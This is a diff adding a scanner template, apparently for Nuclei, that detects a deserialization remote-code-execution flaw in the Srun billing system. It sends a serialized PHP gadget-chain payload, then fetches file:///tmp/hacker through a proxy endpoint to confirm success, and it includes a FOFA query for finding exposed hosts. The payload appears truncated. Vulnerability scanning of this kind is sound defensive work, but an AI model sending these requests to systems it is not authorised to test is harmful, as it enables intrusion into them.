@@ -1,0 +1,47 @@
+id: srun-strategy-deserialization
+info:
+  name: 深澜计费管理系统 strategy - deserialization
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fstrategy%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="/js/lib/slimscroll.js"
+  tags: srun,unserialized,deserialization
+
+
+http:
+  - raw:
+      - |
+        POST /strategy/ip/bind-ip HTTP/2
+        Host: {{Hostname}}
+        Cookie: lang=zh-CN; PHPSESSID_8080=f434cd5f5e9befe38ab3d688b49eacb5; _csrf-8080=515a2ce1d579e3eb33de0fb00d2eddb40cbfb5db938eb248ddaa2069ed9ba803a%3A2%3A%7Bi%3A0%3Bs%3A10%3A%22_csrf-8080%22%3Bi%3A1%3Bs%3A32%3A%22zKeB2l7C4-gTmKM4dulmKqnWGCnlHFDP%22%3B%7D
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+        Content-Length: 1265
+
+        data1=O%3A33%3A%22setasign%5CFpdi%5CPdfReader%5CPdfReader%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00parser%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A12%3A%7B
+      
+      - |
+        GET /demo/proxy?url=file:///tmp/hacker HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 302 && status_code_2 == 200'
